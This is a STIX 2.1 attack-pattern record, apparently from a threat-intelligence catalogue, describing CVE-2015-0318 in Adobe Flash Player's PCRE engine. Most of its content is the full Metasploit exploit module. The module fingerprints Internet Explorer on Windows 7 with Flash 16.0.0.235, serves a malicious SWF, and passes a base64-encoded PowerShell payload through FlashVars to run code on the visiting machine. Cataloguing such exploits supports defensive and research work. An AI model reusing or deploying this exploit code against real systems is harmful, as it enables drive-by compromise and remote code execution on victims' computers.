{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--90e0a538-6f5d-417e-81e8-fdcf09087065",
    "created": "2024-08-14T16:40:37.90691Z",
    "modified": "2024-08-14T16:40:37.906914Z",
    "name": "\"Adobe Flash Player PCRE Regex Vulnerability\"",
    "description": " This module exploits a vulnerability found in Adobe Flash Player. A compilation logic error in the PCRE engine, specifically in the handling of the \\c escape sequence when followed by a multi-byte UTF8 character, allows arbitrary execution of PCRE bytecode.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/adobe_flash_pcre.rb",
            "external_id": "adobe_flash_pcre.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-0318"
        },
        {
            "source_name": "reference",
            "url": "http://googleprojectzero.blogspot.com/2015/02/exploitingscve-2015-0318sinsflash.html"
        },
        {
            "source_name": "reference",
            "url": "https://code.google.com/p/google-security-research/issues/detail?id=199"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  CLASSID =  'd27cdb6e-ae6d-11cf-96b8-444553540000'\n\n  include Msf::Exploit::Powershell\n  include Msf::Exploit::Remote::BrowserExploitServer\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Adobe Flash Player PCRE Regex Vulnerability\",\n      'Description'    => %q{\n        This module exploits a vulnerability found in Adobe Flash Player. A compilation logic error\n        in the PCRE engine, specifically in the handling of the \\c escape sequence when followed by\n        a multi-byte UTF8 character, allows arbitrary execution of PCRE bytecode.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Mark Brand', # Found vuln\n          'sinn3r'      # MSF\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2015-0318' ],\n          [ 'URL', 'http://googleprojectzero.blogspot.com/2015/02/exploitingscve-2015-0318sinsflash.html' ],\n          [ 'URL', 'https://code.google.com/p/google-security-research/issues/detail?id=199' ]\n        ],\n      'Payload'        =>\n        {\n          'Space' => 1024,\n          'DisableNops' => true\n        },\n      'DefaultOptions'  =>\n        {\n          'Retries' => true\n        },\n      'Platform'       => 'win',\n      'BrowserRequirements' =>\n        {\n          :source  => /script|headers/i,\n          :activex => [\n            {\n              clsid: \"{#{CLASSID}}\",\n              method: \"LoadMovie\"\n            }\n          ],\n          :os_name => OperatingSystems::Match::WINDOWS_7,\n          :ua_name => Msf::HttpClients::IE,\n          # Ohter versions are vulnerable but .235 is the one that works for me pretty well\n          # So we're gonna limit to this one for now. More validation needed in the future.\n          :flash   => lambda { |ver| ver == '16.0.0.235' }\n        },\n      'Targets'        =>\n        [\n          [ 'Automatic', {} ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2014-11-25',\n      'DefaultTarget'  => 0))\n  end\n\n  def exploit\n    # Please see data/exploits/CVE-2015-0318/ for source,\n    # that's where the actual exploit is\n    @swf = create_swf\n    super\n  end\n\n  def on_request_exploit(cli, request, target_info)\n    print_status(\"Request: #{request.uri}\")\n\n    if request.uri =~ /\\.swf$/\n      print_status(\"Sending SWF...\")\n      send_response(cli, @swf, {'Content-Type'=>'application/x-shockwave-flash', 'Pragma' => 'no-cache'})\n      return\n    end\n\n    print_status(\"Sending HTML...\")\n    tag = retrieve_tag(cli, request)\n    profile = browser_profile[tag]\n    profile[:tried] = false unless profile.nil? # to allow request the swf\n    send_exploit_html(cli, exploit_template(cli, target_info), {'Pragma' => 'no-cache'})\n  end\n\n  def exploit_template(cli, target_info)\n    swf_random = \"#{rand_text_alpha(4 + rand(3))}.swf\"\n    target_payload = get_payload(cli, target_info)\n    psh_payload = cmd_psh_payload(target_payload, 'x86', {remove_comspec: true})\n    b64_payload = Rex::Text.encode_base64(psh_payload)\n\n    html_template = %Q|<html>\n    <body>\n    <object classid=\"clsid:#{CLASSID}\" codebase=\"http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab\" width=\"1\" height=\"1\" />\n    <param name=\"movie\" value=\"<%=swf_random%>\" />\n    <param name=\"allowScriptAccess\" value=\"always\" />\n    <param name=\"FlashVars\" value=\"sh=<%=b64_payload%>\" />\n    <param name=\"Play\" value=\"true\" />\n    <embed type=\"application/x-shockwave-flash\" width=\"1\" height=\"1\" src=\"<%=swf_random%>\" allowScriptAccess=\"always\" FlashVars=\"sh=<%=b64_payload%>\" Play=\"true\"/>\n    </object>\n    </body>\n    </html>\n    |\n\n    return html_template, binding()\n  end\n\n  def create_swf\n    path = ::File.join( Msf::Config.data_directory, \"exploits\", \"CVE-2015-0318\", \"Main.swf\" )\n    swf = ::File.open(path, 'rb') { |f| swf = f.read }\n\n    swf\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-11-25",
    "x_mitre_platforms": [
        "win'"
    ]
}